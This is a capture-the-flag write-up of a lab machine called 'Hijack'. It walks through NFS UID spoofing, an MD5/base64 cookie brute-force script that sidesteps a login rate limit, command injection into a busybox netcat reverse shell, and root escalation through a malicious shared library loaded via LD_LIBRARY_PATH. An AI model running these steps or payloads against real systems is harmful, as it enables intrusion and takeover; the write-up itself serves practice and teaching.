---
title: Hijack Writeup
---

Add target to `/etc/hosts`:
![[Pasted image 20260528205739.png]]

Run `Nmap`:
```bash
sudo nmap -sS -sV -p- -oN scan 10.49.144.208
Nmap scan report for hijack.thm (10.49.144.208)
Host is up (0.083s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
21/tcp    open  ftp      vsftpd 3.0.3
22/tcp    open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http     Apache httpd 2.4.18 ((Ubuntu))
111/tcp   open  rpcbind  2-4 (RPC #100000)
2049/tcp  open  nfs      2-4 (RPC #100003)
34686/tcp open  mountd   1-3 (RPC #100005)
41744/tcp open  nlockmgr 1-4 (RPC #100021)
47434/tcp open  mountd   1-3 (RPC #100005)
52240/tcp open  mountd   1-3 (RPC #100005)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu May 28 03:54:10 2026 -- 1 IP address (1 host up) scanned in 53.07 seconds
```

Let's visit the web:
![[Pasted image 20260528205955.png]]

Tried logging in as admin to know if the user existed - it did:
![[Pasted image 20260528210052.png]]
![[Pasted image 20260528210107.png]]

Let's sign up an account:
![[Pasted image 20260528210156.png]]

Visiting `Administration` resulted access denied:
![[Pasted image 20260528210226.png]]

Logged out and sign up another account with `<script>alert(XSS)</script>` as the username, then log back in resulted in a successful **stored XSS** but couldn't get the use of it:
![[Pasted image 20260528210537.png]]

The target seems to keep track of its user by attaching a cookie:
![[Pasted image 20260528210710.png]]

It looks familiar... Let's try decoding it:
![[Pasted image 20260528210817.png]]

`f5d1278e8109edd94e1e4197e04873b9` looks like a hash. Let's try identifying it:
![[Pasted image 20260528210932.png]]

So, the developer uses user's base64 encoded credentials as the cookie. Weird. Keep that aside, let's check `ftp` for anonymous log in:
![[Pasted image 20260528211145.png]]

No luck. Let's list all the sharing directories:
![[Pasted image 20260528211315.png]]

Let's mount it to our machine:
![[Pasted image 20260528211523.png]]
*NOTE: it is showing `hijack hijack` because I already created the user with id and gid 1003*

We can't access the directory because of the permissions `drwx------` and only the owner (`1003`) can access the directory. So, Let's create a user with that id:
```bash
mongkol@mongkol:~/Desktop/ctf/hijack$ sudo useradd -u 1003 -m -s /bin/bash hijack
mongkol@mongkol:~/Desktop/ctf/hijack$ sudo passwd hijack
```

Give access `/home/mongkol/Desktop/ctf/hijack` to the new user:
```bash
mongkol@mongkol:~/Desktop/ctf/hijack$ chmod o+x /home/mongkol/Desktop/ctf/hijack
```

Change to the new user and view the content inside the directory:
```bash
mongkol@mongkol:~/Desktop/ctf/hijack$ su hijack
Password:
hijack@mongkol:/home/mongkol/Desktop/ctf/hijack$ ls
note.txt  scan  share
hijack@mongkol:/home/mongkol/Desktop/ctf/hijack$ cd share
hijack@mongkol:/home/mongkol/Desktop/ctf/hijack/share$ ls -la
total 12
drwx------ 2 hijack  hijack  4096 Aug  9  2023 .
drwxrwxr-x 3 mongkol mongkol 4096 May 28 06:46 ..
-rwx------ 1 hijack  hijack    46 Aug  9  2023 for_employees.txt
```

Reading `for_employees.txt` gives us a `ftp` user's credentials:
```bash
ftp creds :

ftpuser:[redacted]
```

Let's login:
![[Pasted image 20260528212530.png]]

Let's download `.from_admin.txt` and `.passwords_list.txt` and read their contents:
```bash
mongkol@mongkol:~/Desktop/ctf/hijack$ cat .from_admin.txt
To all employees, this is "admin" speaking,
i came up with a safe list of passwords that you all can use on the site, these passwords don't appear on any wordlist i tested so far, so i encourage you to use them, even me i'm using one of those.

NOTE To rick : good job on limiting login attempts, it works like a charm, this will prevent any future brute forcing.
```

So, there is a rate limit at the login form and the `admin` is also using one of the password in `.passwords_list.txt`. hydra won't do the trick because of rate limit.

However, remember that the developer is using the user's encoded creds as the cookie. Invalid admin cookie will result in access denied at `/administration`.

Let's craft a custom script:
```python
import requests
import hashlib
import base64

url = "http://hijack.thm/administration.php"

with open(".passwords_list.txt", "r", encoding="latin-1") as f:
    passwords = f.read().splitlines()

for password in passwords:
    md5pass = hashlib.md5(password.encode("utf-8")).hexdigest()

    creds = f"admin:{md5pass}".encode("utf-8")

    b64_creds = base64.b64encode(creds).decode("utf-8")

    headers = {
    "Cookie": f"PHPSESSID={b64_creds}"
    }
    
    response = requests.get(url, headers=headers)
    
    if "Access denied" not in response.text:
        print(f"[+] Found Valid Password: {password}")
        break
    else:
        print(f"[-] Tried: {password}: Invalid ")
```

Result:
```bash
[+] Found Valid Password: [redacted]
```

Let's log in as admin with the new found password:
![[Pasted image 20260528213147.png]]

I tried some command injections, and this is what I found. Input `--` resulted:
![[Pasted image 20260528213301.png]]

Input `;id` resulted:
![[Pasted image 20260528213323.png]]

And finally, `id && id`:
![[Pasted image 20260528213355.png]]

Command Injected successfully, so let's get a reverse shell (`busybox`):
![[Pasted image 20260528213751.png]]

The listener:
![[Pasted image 20260528213822.png]]

On the admin page:
```bash
id && busybox nc 192.168.134.218 4444 -e sh
```

The shell:
![[Pasted image 20260528213936.png]]

Let's spawn a proper shell with python3:
![[Pasted image 20260528214015.png]]

Here's what I found and let's read `config.php`:
![[Pasted image 20260528214548.png]]

We got pure DB credentials, but the database shows nothing interesting because there was only a user table containing the username and their password hashes.

Is the password resuable?
![[Pasted image 20260528214721.png]]

Indeed it is, let's get the user's flag:
![[Pasted image 20260528214813.png]]

Next, run `sudo -l` to see what rick can do:
![[Pasted image 20260528214918.png]]

Keep note of `LB_LIBRARY_PATH`, but for now let's search what can `apache2` do here:
![[Pasted image 20260528215022.png]]

Sadly, we can only read file, and only a specific file. Let's try abusing `LD_LIBRARY_PATH`. First, let see what `apache2` depends on (equivalent of Windows `dll`):
![[Pasted image 20260528215253.png]]

Take note of `libcrypt.so.1`, now let's create a malicious C code that will spawn a root shell:
```C
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
static void revShell() __attribute__((constructor));
void revShell() {
	setuid(0);
	setgid(0);
	printf("Reverse Shell via library hijacking... \n");
	const char *ncshell = "busybox nc 192.168.134.218 4545 -e sh";
	system(ncshell);
}
```

Change directory into `/tmp` and create the shell:
![[Pasted image 20260528220118.png]]

Compile the malicious library into a shared library:
```bash
gcc -shared -fPIC -o libcrypt.so.1 shell.c -nostartfiles
```

Setup a listener:
```bash
nc -vlnp 4545
```

Run the command to trick the system into checking the `/tmp` folder first for `apache2`'s dependencies:
```bash
sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
```

The root shell:
![[Pasted image 20260528222211.png]]
